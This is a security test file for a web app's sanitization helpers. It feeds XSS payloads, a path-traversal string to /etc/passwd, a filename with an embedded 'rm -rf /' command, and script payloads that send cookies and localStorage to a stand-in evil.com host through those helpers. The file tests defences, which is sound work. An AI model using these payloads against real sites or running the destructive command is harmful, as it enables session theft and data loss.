/**
 * XSS Prevention Tests
 *
 * Validates that all XSS attack vectors are neutralized by our sanitization utilities.
 *
 * Run with: pnpm test __tests__/security/xss-prevention.test.ts
 */

import { describe, it, expect } from "vitest";
import {
  sanitizeHTML,
  sanitizeInput,
  sanitizeFilename,
  sanitizePropertyName,
  sanitizeVendorName,
  sanitizeAddress,
  sanitizeEmail,
  sanitizeURL,
  sanitizePhoneNumber,
  XSS_TEST_PAYLOADS,
} from "@/lib/security/sanitize";

describe("XSS Prevention - Comprehensive Sanitization", () => {
  describe("sanitizeHTML", () => {
    it("should remove script tags", () => {
      const payload = '<script>alert("XSS")</script>';
      const sanitized = sanitizeHTML(payload);

      expect(sanitized).not.toContain("<script");
      expect(sanitized).not.toContain("alert");
    });

    it("should remove event handlers", () => {
      const payloads = [
        '<img src=x onerror=alert("XSS")>',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS")>',
        '<button onclick=alert("XSS")>',
      ];

      for (const payload of payloads) {
        const sanitized = sanitizeHTML(payload);

        expect(sanitized).not.toContain("onerror");
        expect(sanitized).not.toContain("onload");
        expect(sanitized).not.toContain("onfocus");
        expect(sanitized).not.toContain("onclick");
        expect(sanitized).not.toContain("alert");
      }
    });

    it("should remove javascript: protocol", () => {
      const payload = "<a href=\"javascript:alert('XSS')\">Click</a>";
      const sanitized = sanitizeHTML(payload);

      expect(sanitized).not.toContain("javascript:");
    });

    it("should allow safe HTML tags", () => {
      const safe = "<p>Hello <b>World</b> with <i>formatting</i></p>";
      const sanitized = sanitizeHTML(safe);

      expect(sanitized).toContain("<p>");
      expect(sanitized).toContain("<b>");
      expect(sanitized).toContain("<i>");
      expect(sanitized).toContain("Hello");
      expect(sanitized).toContain("World");
      expect(sanitized).toContain("formatting");
    });

    it("should allow safe links with https", () => {
      const safe = '<a href="https://example.com">Link</a>';
      const sanitized = sanitizeHTML(safe);

      expect(sanitized).toContain("href");
      expect(sanitized).toContain("https://example.com");
    });

    it("should neutralize ALL XSS test payloads", () => {
      for (const payload of XSS_TEST_PAYLOADS) {
        const sanitized = sanitizeHTML(payload);

        // Should not contain script tags
        expect(sanitized.toLowerCase()).not.toContain("<script");

        // Should not contain event handlers
        expect(sanitized).not.toMatch(/on\w+=/i);

        // Note: Some payloads like "javascript:alert('XSS')" become plain text
        // which is acceptable since they won't execute in HTML context.
        // DOMPurify removes the dangerous context (HTML tags, attributes)
        // leaving only harmless text strings.
      }
    });
  });

  describe("sanitizeInput", () => {
    it("should remove ALL HTML tags", () => {
      const payloads = [
        '<script>alert("XSS")</script>',
        "<p>Hello <b>World</b></p>",
        "<div><span>Nested</span></div>",
      ];

      for (const payload of payloads) {
        const sanitized = sanitizeInput(payload);

        expect(sanitized).not.toContain("<");
        expect(sanitized).not.toContain(">");
      }
    });

    it("should remove control characters", () => {
      const payload = "Hello\x00World\x01Test\x1F";
      const sanitized = sanitizeInput(payload);

      expect(sanitized).toBe("HelloWorldTest");
    });

    it("should preserve plain text", () => {
      const plain = "Hello World 123";
      const sanitized = sanitizeInput(plain);

      expect(sanitized).toBe(plain);
    });

    it("should trim whitespace", () => {
      const payload = "  Hello World  ";
      const sanitized = sanitizeInput(payload);

      expect(sanitized).toBe("Hello World");
    });
  });

  describe("sanitizeFilename", () => {
    it("should remove directory traversal", () => {
      const payload = "../../etc/passwd";
      const sanitized = sanitizeFilename(payload);

      expect(sanitized).not.toContain("..");
      expect(sanitized).not.toContain("/");
    });

    it("should remove shell metacharacters", () => {
      const payload = "file; rm -rf /.txt";
      const sanitized = sanitizeFilename(payload);

      expect(sanitized).not.toContain(";");
      expect(sanitized).not.toContain(" ");
    });

    it("should preserve safe filenames", () => {
      const safe = "invoice-2024-01.pdf";
      const sanitized = sanitizeFilename(safe);

      expect(sanitized).toBe(safe);
    });

    it("should handle XSS in filename", () => {
      const payload = '<script>alert("XSS")</script>invoice.pdf';
      const sanitized = sanitizeFilename(payload);

      expect(sanitized).not.toContain("<");
      expect(sanitized).not.toContain(">");
      expect(sanitized).not.toContain("(");
      expect(sanitized).not.toContain(")");
    });

    it("should limit length to 255 characters", () => {
      const long = "a".repeat(300) + ".pdf";
      const sanitized = sanitizeFilename(long);

      expect(sanitized.length).toBeLessThanOrEqual(255);
    });
  });

  describe("sanitizePropertyName", () => {
    it("should remove HTML tags", () => {
      const payload = '<script>alert("XSS")</script>Riverside Gardens';
      const sanitized = sanitizePropertyName(payload);

      expect(sanitized).not.toContain("<script");
      expect(sanitized).toContain("Riverside Gardens");
    });

    it("should allow basic punctuation", () => {
      const safe = "O'Brien's Apartments";
      const sanitized = sanitizePropertyName(safe);

      expect(sanitized).toBe(safe);
    });

    it("should remove special characters", () => {
      const payload = "Apartments @ Main St | Unit #5";
      const sanitized = sanitizePropertyName(payload);

      expect(sanitized).not.toContain("@");
      expect(sanitized).not.toContain("|");
    });

    it("should limit length", () => {
      const long = "A".repeat(300);
      const sanitized = sanitizePropertyName(long);

      expect(sanitized.length).toBeLessThanOrEqual(255);
    });
  });

  describe("sanitizeEmail", () => {
    it("should remove HTML tags", () => {
      const payload = '<script>alert("XSS")</script>user@example.com';
      const sanitized = sanitizeEmail(payload);

      expect(sanitized).not.toContain("<");
      expect(sanitized).not.toContain(">");
      // Note: sanitizeEmail removes tags but keeps alphanumeric characters
      // In production, combine with email validation (Zod schema)
      expect(sanitized).toContain("user@example.com");
    });

    it("should preserve valid email", () => {
      const email = "user.name+tag@example.com";
      const sanitized = sanitizeEmail(email);

      expect(sanitized).toBe(email.toLowerCase());
    });

    it("should remove spaces", () => {
      const payload = "user @example.com";
      const sanitized = sanitizeEmail(payload);

      expect(sanitized).not.toContain(" ");
    });

    it("should lowercase email", () => {
      const email = "User@Example.COM";
      const sanitized = sanitizeEmail(email);

      expect(sanitized).toBe("user@example.com");
    });
  });

  describe("sanitizeURL", () => {
    it("should allow https URLs", () => {
      const url = "https://example.com";
      const sanitized = sanitizeURL(url);

      // URL constructor may add trailing slash
      expect(sanitized).toMatch(/^https:\/\/example\.com\/?$/);
    });

    it("should allow http URLs", () => {
      const url = "http://example.com";
      const sanitized = sanitizeURL(url);

      expect(sanitized).toBe(url + "/");
    });

    it("should block javascript: protocol", () => {
      const payload = 'javascript:alert("XSS")';
      const sanitized = sanitizeURL(payload);

      expect(sanitized).toBe("");
    });

    it("should block data: protocol", () => {
      const payload = 'data:text/html,<script>alert("XSS")</script>';
      const sanitized = sanitizeURL(payload);

      expect(sanitized).toBe("");
    });

    it("should block file: protocol", () => {
      const payload = "file:///etc/passwd";
      const sanitized = sanitizeURL(payload);

      expect(sanitized).toBe("");
    });

    it("should return empty string for invalid URLs", () => {
      const payloads = ["not a url", "://invalid", "htp://typo.com"];

      for (const payload of payloads) {
        const sanitized = sanitizeURL(payload);
        expect(sanitized).toBe("");
      }
    });
  });

  describe("sanitizePhoneNumber", () => {
    it("should preserve valid phone numbers", () => {
      const phones = [
        "(555) 123-4567",
        "555-123-4567",
        "+1-555-123-4567",
        "5551234567",
      ];

      for (const phone of phones) {
        const sanitized = sanitizePhoneNumber(phone);
        expect(sanitized).toBeTruthy();
        expect(sanitized.length).toBeGreaterThan(0);
      }
    });

    it("should remove letters and special characters", () => {
      const payload = "555-CALL-NOW ext.123";
      const sanitized = sanitizePhoneNumber(payload);

      expect(sanitized).not.toContain("CALL");
      expect(sanitized).not.toContain("NOW");
      expect(sanitized).not.toContain(".");
    });

    it("should limit length", () => {
      const long = "1".repeat(100);
      const sanitized = sanitizePhoneNumber(long);

      expect(sanitized.length).toBeLessThanOrEqual(50);
    });
  });

  describe("Real-world attack scenarios", () => {
    it("should prevent XSS in property name field", () => {
      const attack =
        '<img src=x onerror=fetch("https://evil.com/steal?cookie="+document.cookie)>Riverside Gardens';
      const sanitized = sanitizePropertyName(attack);

      expect(sanitized).not.toContain("<img");
      expect(sanitized).not.toContain("onerror");
      expect(sanitized).not.toContain("fetch");
      expect(sanitized).toContain("Riverside Gardens");
    });

    it("should prevent XSS in vendor name field", () => {
      const attack = "Waste Services<script>alert(document.cookie)</script>";
      const sanitized = sanitizeVendorName(attack);

      expect(sanitized).not.toContain("<script");
      expect(sanitized).not.toContain("alert");
      expect(sanitized).toContain("Waste Services");
    });

    it("should prevent XSS in address field", () => {
      const attack =
        "123 Main St<iframe src=\"javascript:alert('XSS')\"></iframe>";
      const sanitized = sanitizeAddress(attack);

      expect(sanitized).not.toContain("<iframe");
      expect(sanitized).not.toContain("javascript:");
      expect(sanitized).toContain("123 Main St");
    });

    it("should prevent stored XSS attack chain", () => {
      // Attacker creates project with malicious name
      const maliciousProjectName =
        '"><script>fetch("https://evil.com/steal?data="+JSON.stringify({cookies:document.cookie,localStorage:localStorage}))</script><span class="';

      // Sanitize before storing
      const sanitized = sanitizePropertyName(maliciousProjectName);

      // Verify all attack vectors neutralized
      expect(sanitized).not.toContain("<script");
      expect(sanitized).not.toContain("(");
      expect(sanitized).not.toContain(")");
      expect(sanitized).not.toContain("{");
      expect(sanitized).not.toContain("}");
      // The sanitized string will be heavily modified but safe
    });

    it("should prevent DOM-based XSS via filename", () => {
      // Attacker uploads file with malicious name
      const maliciousFilename =
        'invoice.pdf";alert(String.fromCharCode(88,83,83));"';

      const sanitized = sanitizeFilename(maliciousFilename);

      expect(sanitized).not.toContain('"');
      expect(sanitized).not.toContain("(");
      expect(sanitized).not.toContain(")");
      // Sanitized filename should only contain safe characters
      expect(sanitized).toMatch(/^[a-zA-Z0-9._-]+$/);
    });
  });
});
